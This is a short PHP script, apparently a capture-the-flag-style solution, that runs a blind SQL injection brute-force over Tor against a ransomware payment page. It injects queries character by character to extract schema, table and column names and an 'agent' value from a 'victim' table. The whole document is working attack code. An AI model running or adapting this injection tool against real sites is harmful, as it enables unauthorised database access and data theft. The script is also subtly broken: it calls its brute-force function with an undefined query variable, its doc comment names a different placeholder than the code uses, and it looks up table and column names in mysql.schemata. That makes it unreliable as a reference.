<?php

/**
* Handling HTTP requests using PHP's CURL
* @param	$postData	Urlencoded data to be sent through POST, in format name1[=val1][&name2[=val2]]+
* @return	Request result data, a.k.a page source
*/
function req($postData) {
	$url = "http://ransom6qfmfghgb7.onion/payment.php";

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_PROXY, "127.0.0.1:9050");			// TOR local socks
	curl_setopt($ch, CURLOPT_PROXYTYPE, 7);					// PHP_SOCKS5 + DNS over TOR
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
	curl_setopt($ch, CURLOPT_HEADER, 1);

	$data = curl_exec($ch);
	curl_close($ch);

	return $data;
}

/**
* SQLi blind helper for bruteforce
* @see		$trueText	Text contained in the request where the mysql query returns true
* @param	$cs			Charset being used for bruteforce
* @param	$query		Corresponding query for bruteforce, using %B% as a placeholder for attempts
* @return	The result after bruteforcing, valid input
*/
function brute($cs, $query) {
	$validString = "";
	$trueText = "We still wait";
	$state = true;

	while(true === $state) {
		$state = false;
		foreach(str_split($cs) as $attempt) {
			$queryFinal = str_replace("_BF_", $validString . $attempt, $query);
			$request = req($queryFinal);

			if(strstr($request, $trueText)) {
				$validString .= $attempt;

				echo $validString . PHP_EOL;

				$state = true;
				break;
			}

		}
	}
}

$charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789=-/\\+_. ><";
$query1 = "' or (select schema_name from mysql.schemata where schema_name != 'mysql' and schema_name != 'information_schema' and schema_name != 'test') like '_BF_%' #";
$query2 = "' or (select table_name from mysql.schemata where schema_name = 'msg') like '_BF_%' #";
$query3 = "' or (select column_name from mysql.schemata where table_name = 'victim' limit 0,1 ) like '_BF_%' #";
$query4 = "' or (select column_name from mysql.schemata where table_name = 'victim' limit 1,1 ) like '_BF_%' #";
$query5 = "' or (select column_name from mysql.schemata where table_name = 'victim' limit 1,1 ) like '_BF_%' #";
$query6 = "catalin' or (select BINARY `agent` from victim limit 0, 1) like '_BF_%' #";

brute($charset, $query);

$agent = 'Mozilla/10_0_Gecko/20100101_Firefox/1337_0';			// useragent
$wallet = 'MTliZjRlNTFiN2ZjZDE1OGEyZDUwMDlkMzAzMTgyZDczNzg5OG';	// btc-wallet
